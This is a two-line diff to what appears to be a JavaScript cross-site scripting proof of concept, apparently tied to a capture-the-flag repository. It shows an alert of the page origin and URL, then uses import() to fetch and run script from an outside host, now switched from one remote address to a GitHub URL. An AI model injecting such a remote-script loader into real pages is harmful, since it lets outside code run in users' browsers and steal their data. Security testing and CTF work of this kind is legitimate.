@@ -1,2 +1,2 @@
 alert('Wow! Origin: ' + location.origin + '\nUrl: ' + top.location.href + '?');
-import('https://bo0om.ru/x/');
+import('https://github.com/T4tX/CTF/blob/main/x/');
